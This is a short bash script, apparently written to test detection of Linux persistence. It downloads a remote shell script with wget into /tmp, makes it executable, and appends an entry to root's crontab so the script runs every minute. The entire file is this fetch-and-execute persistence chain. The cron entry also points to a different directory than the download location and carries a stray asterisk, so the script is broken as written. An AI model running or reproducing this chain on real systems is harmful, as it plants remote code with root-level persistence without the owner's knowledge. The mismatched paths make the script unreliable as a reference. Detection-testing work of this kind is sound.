#!/bin/bash

mkdir /tmp/persistencetest/

#Grab the attack script
wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello1.sh" -O /tmp/persistencetest/attack2.sh

#Wait for 5 seconds
sleep 5

chmod +x /tmp/persistencetest/attack2.sh

sleep 5

#Create cron job to execute attack script every 1 minute
echo "*/1 * * * * /tmp/persistence/attack2.sh*" >> /var/spool/cron/crontabs/root

# crontab -u username -l to list the crontab for the user
